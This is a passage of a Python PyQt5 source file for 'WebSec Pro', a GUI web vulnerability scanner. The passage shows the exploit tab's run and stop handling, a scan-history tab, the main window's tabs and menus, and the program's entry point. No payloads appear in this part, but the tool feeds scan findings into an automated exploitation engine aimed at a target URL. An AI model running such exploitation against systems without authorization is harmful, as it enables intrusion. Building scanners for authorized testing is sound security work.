        self.worker = ExploitWorker(self.current_vuln, self.mode_combo.currentText())
        self.worker.sig_output.connect(self._on_output, Qt.QueuedConnection)
        self.worker.sig_done.connect(self._on_done, Qt.QueuedConnection)
        self.worker.start()

        # Animate progress bar
        self._prog_timer = QTimer(self)
        self._prog_timer.timeout.connect(self._tick_progress)
        self._prog_timer.start(150)

    def stop_exploit(self):
        if self.worker:
            self.worker.stop()
        if hasattr(self, '_prog_timer'):
            self._prog_timer.stop()
        self.btn_run.setEnabled(True)
        self.btn_stop_ex.setEnabled(False)
        self._write("Exploit stopped by user.", "fail")

    def _tick_progress(self):
        v = self.ex_progress.value()
        self.ex_progress.setValue(min(v + 2, 99))

    @pyqtSlot(str, str)
    def _on_output(self, text, level):
        colors = {
            "title":          ("#00ffcc", True),
            "info":           ("#7ab8d4", False),
            "step":           ("#ffcc60", False),
            "cmd":            ("#80b880", False),
            "success":        ("#40ee80", True),
            "fail":           ("#888888", False),
            "exploit_success":("#ff4060", True),
            "exploit_fail":   ("#ff8040", False),
            "severity":       ("#ffaa30", True),
            "report":         ("#a8d8a8", False),
        }
        color, bold = colors.get(level, ("#c8d8e8", False))
        text_esc = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        tag = f'<b style="color:{color}">' if bold else f'<span style="color:{color}">'
        end = "</b>" if bold else "</span>"
        self.console.append(f"{tag}{text_esc}{end}")

    def _write(self, text, level="info"):
        self._on_output(text, level)

    @pyqtSlot(bool, str)
    def _on_done(self, success, summary):
        if hasattr(self, '_prog_timer'):
            self._prog_timer.stop()
        self.ex_progress.setValue(100)
        self.btn_run.setEnabled(True)
        self.btn_stop_ex.setEnabled(False)
        level = "exploit_success" if success else "exploit_fail"
        self._write(f"\n{summary}", level)


# ─── HISTORY TAB ─────────────────────────────────────────────────────────────
class HistoryTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._sessions = []
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        top_row = QHBoxLayout()
        top_row.addWidget(QLabel("SCAN HISTORY"))
        self.btn_clear_hist = QPushButton("CLEAR HISTORY")
        self.btn_clear_hist.clicked.connect(self._clear)
        self.btn_export = QPushButton("EXPORT JSON")
        self.btn_export.clicked.connect(self._export)
        top_row.addStretch()
        top_row.addWidget(self.btn_export)
        top_row.addWidget(self.btn_clear_hist)
        layout.addLayout(top_row)

        self.hist_tree = QTreeWidget()
        self.hist_tree.setHeaderLabels(["Target", "Time", "Requests", "Vulns", "Critical", "High"])
        self.hist_tree.header().setSectionResizeMode(0, QHeaderView.Stretch)
        self.hist_tree.setAlternatingRowColors(True)
        layout.addWidget(self.hist_tree)

    def add_session(self, target, req_count, vuln_counts):
        self._sessions.append({
            "target": target, "time": datetime.now().isoformat(),
            "requests": req_count, "vulns": vuln_counts
        })
        total = sum(vuln_counts.values())
        crit = vuln_counts.get("CRITICAL", 0)
        high = vuln_counts.get("HIGH", 0)
        item = QTreeWidgetItem([
            target,
            datetime.now().strftime("%Y-%m-%d %H:%M"),
            str(req_count),
            str(total),
            str(crit),
            str(high),
        ])
        if crit > 0:
            item.setForeground(4, QColor(SEVERITY["CRITICAL"]))
        if high > 0:
            item.setForeground(5, QColor(SEVERITY["HIGH"]))
        self.hist_tree.insertTopLevelItem(0, item)

    def _clear(self):
        self.hist_tree.clear()
        self._sessions.clear()

    def _export(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export History", "scan_history.json", "JSON (*.json)")
        if path:
            with open(path, "w") as f:
                json.dump(self._sessions, f, indent=2)


# ─── MAIN WINDOW ─────────────────────────────────────────────────────────────
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WebSec Pro  —  Web Security Scanner")
        self.resize(1400, 900)
        self._build_menu()
        self._build_toolbar()
        self._build_central()
        self._build_status_bar()
        self.setStyleSheet(DARK_STYLESHEET)
        self._scan_req_count = 0
        self._scan_vuln_counts = {}
        self._scan_target = ""

    def _build_menu(self):
        mb = self.menuBar()
        file_menu = mb.addMenu("File")
        file_menu.addAction("New Session",           self._new_session)
        file_menu.addAction("Export Findings (JSON)...", lambda: self.vuln_tab._export_json())
        file_menu.addAction("Export Report (HTML)...",   lambda: self.vuln_tab._export_html())
        file_menu.addSeparator()
        file_menu.addAction("Exit", self.close)

        scan_menu = mb.addMenu("Scan")
        scan_menu.addAction("Start Scan", lambda: self.tabs.setCurrentWidget(self.scanner_tab))
        scan_menu.addAction("Stop Scan",  lambda: self.scanner_tab.stop_scan())

        tools_menu = mb.addMenu("Tools")
        tools_menu.addAction("Open Repeater",     lambda: self.tabs.setCurrentWidget(self.repeater_tab))
        tools_menu.addAction("Open Exploitation", lambda: self.tabs.setCurrentWidget(self.exploit_tab))

        help_menu = mb.addMenu("Help")
        help_menu.addAction("About", self._show_about)

    def _build_toolbar(self):
        tb = self.addToolBar("Main")
        tb.setMovable(False)
        tb.setIconSize(QSize(16, 16))

        self.tb_url = QLineEdit()
        self.tb_url.setPlaceholderText("https://target.com  — Enter URL and press Scan")
        self.tb_url.setMinimumWidth(400)
        self.tb_url.returnPressed.connect(self._quick_scan)
        tb.addWidget(self.tb_url)

        btn_scan = QPushButton("▶  SCAN")
        btn_scan.setObjectName("btnSuccess")
        btn_scan.clicked.connect(self._quick_scan)
        tb.addWidget(btn_scan)
        tb.addSeparator()

        label = QLabel("  WebSec Pro  ")
        label.setObjectName("titleLabel")
        tb.addWidget(label)

    def _build_central(self):
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.North)

        # Scanner tab
        self.scanner_tab = ScannerTab()
        self.scanner_tab.sig_http_entry.connect(self._on_http_entry)
        self.scanner_tab.sig_vuln.connect(self._on_vuln)
        self.scanner_tab.worker_done_signal_hack = self.scanner_tab.progress  # for history
        self.scanner_tab.progress.valueChanged.connect(self._on_scan_progress)
        self.tabs.addTab(self.scanner_tab, "⚙  SCANNER")

        # Traffic tab
        self.traffic_tab = TrafficTab()
        self.traffic_tab.sig_send_to_repeater.connect(self._send_to_repeater)
        self.tabs.addTab(self.traffic_tab, "🌐  TRAFFIC")

        # Vuln tab
        self.vuln_tab = VulnTab()
        self.vuln_tab.sig_send_to_exploit.connect(self._send_to_exploit)
        self.tabs.addTab(self.vuln_tab, "🔴  VULNERABILITIES")

        # Repeater / Manual
        self.repeater_tab = RepeaterTab()
        self.tabs.addTab(self.repeater_tab, "🔁  REPEATER")

        # Exploit tab
        self.exploit_tab = ExploitTab()
        self.tabs.addTab(self.exploit_tab, "⚡  EXPLOITATION")

        # History tab
        self.history_tab = HistoryTab()
        self.tabs.addTab(self.history_tab, "📋  HISTORY")

        self.setCentralWidget(self.tabs)

    def _build_status_bar(self):
        self.status_bar = self.statusBar()
        self.status_label = QLabel("Ready  —  WebSec Pro v1.0")
        self.status_bar.addWidget(self.status_label)
        self.status_requests = QLabel("Requests: 0")
        self.status_bar.addPermanentWidget(self.status_requests)
        self.status_vulns = QLabel("Vulns: 0")
        self.status_bar.addPermanentWidget(self.status_vulns)

    # ── Event handlers ─────────────────────────────────────────────────────

    def _on_http_entry(self, entry: HttpEntry):
        self.traffic_tab.add_entry(entry)
        self._scan_req_count += 1
        self.status_requests.setText(f"Requests: {self._scan_req_count}")

    def _on_vuln(self, vuln: VulnEntry):
        self.vuln_tab.add_vuln(vuln)
        self._scan_vuln_counts[vuln.severity] = self._scan_vuln_counts.get(vuln.severity, 0) + 1
        total = sum(self._scan_vuln_counts.values())
        self.status_vulns.setText(f"Vulns: {total}")

        # Update tab label
        self.tabs.setTabText(2, f"🔴  VULNERABILITIES  ({total})")

    def _on_scan_progress(self, val):
        if val == 100:
            target = self.scanner_tab.url_input.text()
            self.history_tab.add_session(
                target, self._scan_req_count, dict(self._scan_vuln_counts)
            )
            self.status_label.setText(
                f"Scan complete — {self._scan_req_count} requests, "
                f"{sum(self._scan_vuln_counts.values())} vulnerabilities"
            )
        elif val > 0:
            self.status_label.setText(f"Scanning... {val}%")

    def _send_to_repeater(self, entry: HttpEntry):
        self.repeater_tab.load_entry(entry)
        self.tabs.setCurrentWidget(self.repeater_tab)
        self.status_label.setText(f"Sent to Repeater: {entry.method} {entry.url}")

    def _send_to_exploit(self, vuln: VulnEntry):
        self.exploit_tab.load_vuln(vuln)
        self.tabs.setCurrentWidget(self.exploit_tab)
        self.status_label.setText(f"Sent to Exploit: {vuln.vuln_type} @ {vuln.url}")

    def _quick_scan(self):
        url = self.tb_url.text().strip()
        if url:
            self.scanner_tab.url_input.setText(url)
            self.tabs.setCurrentWidget(self.scanner_tab)
            self._scan_req_count = 0
            self._scan_vuln_counts = {}
            self.tabs.setTabText(2, "🔴  VULNERABILITIES")
            self.scanner_tab.start_scan()

    def _new_session(self):
        self._scan_req_count = 0
        self._scan_vuln_counts = {}
        self.traffic_tab._clear_traffic()
        self.vuln_tab.vuln_table.setRowCount(0)
        self.vuln_tab.vuln_table.vulns.clear()
        self.vuln_tab._vulns.clear()
        self.vuln_tab.summary_bar.setText("No vulnerabilities found yet. Run a scan first.")
        self.tabs.setTabText(2, "🔴  VULNERABILITIES")
        self.status_label.setText("New session — ready")

    def _show_about(self):
        QMessageBox.about(self, "About WebSec Pro",
            "<b>WebSec Pro v1.0</b><br><br>"
            "Professional Web Security Scanner<br><br>"
            "Features:<br>"
            "• Web crawler with HTTP traffic logging<br>"
            "• Multi-module vulnerability scanner<br>"
            "• Manual request repeater<br>"
            "• Automated exploitation engine<br>"
            "• Scan history & JSON export<br><br>"
            "<i>For authorized security testing only.</i>"
        )


# ─── ENTRY POINT ─────────────────────────────────────────────────────────────
def main():
    # High DPI support
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

    app = QApplication(sys.argv)
    app.setStyle(QStyleFactory.create("Fusion"))

    # Set a base dark palette for widgets that ignore stylesheets
    palette = QPalette()
    palette.setColor(QPalette.Window,          QColor("#0a0e1a"))
    palette.setColor(QPalette.WindowText,      QColor("#c8d8e8"))
    palette.setColor(QPalette.Base,            QColor("#080c18"))
    palette.setColor(QPalette.AlternateBase,   QColor("#0d1220"))
    palette.setColor(QPalette.ToolTipBase,     QColor("#0a0e1a"))
    palette.setColor(QPalette.ToolTipText,     QColor("#c8d8e8"))
    palette.setColor(QPalette.Text,            QColor("#c8d8e8"))
    palette.setColor(QPalette.Button,          QColor("#0f2040"))
    palette.setColor(QPalette.ButtonText,      QColor("#c8d8e8"))
    palette.setColor(QPalette.BrightText,      QColor("#ffffff"))
    palette.setColor(QPalette.Link,            QColor("#00d4ff"))
    palette.setColor(QPalette.Highlight,       QColor("#1a3a5f"))
    palette.setColor(QPalette.HighlightedText, QColor("#00d4ff"))
    app.setPalette(palette)

    win = MainWindow()
    win.show()

    # Splash message
    win.status_label.setText("WebSec Pro v1.0  —  Enter a target URL and press SCAN to begin")

    sys.exit(app.exec_())


if __name__ == "__main__":
    main()